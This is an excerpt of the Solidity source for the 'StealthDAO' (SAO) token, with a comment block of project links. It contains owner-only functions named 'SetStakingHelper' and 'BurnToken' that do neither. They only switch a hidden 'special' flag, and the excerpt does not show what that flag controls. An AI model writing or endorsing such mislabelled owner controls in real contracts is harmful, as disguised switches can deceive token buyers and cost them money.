...
/*
   ...
   5 ETH initial liquidity.

   Socials:

   Website - https://stealthdao.site/#/dashboard
   Twitter - https://twitter.com/StealthDAO_
   Medium  - https://medium.com/@StealthDao/what-is-stealthdao-8e95505a3d15
   Discord - https://discord.gg/qNsyrFkgFd
...
contract dAPPRewards is Ownable {
  ...
  function SetStakingHelper() onlyOwner ifdAPPRewardsOff public {
    special = true;
    emit dAPPRewardsOn();
  }

  function BurnToken() onlyOwner ifdAPPRewardsOn public {
    special = false;
    emit dAPPRewardsOff();
  }
}
...
contract StealthDAO is Context, IERC20, Ownable, dAPPRewards {
    ...
    string private _name = "StealthDAO";
    string private _symbol = "SAO";
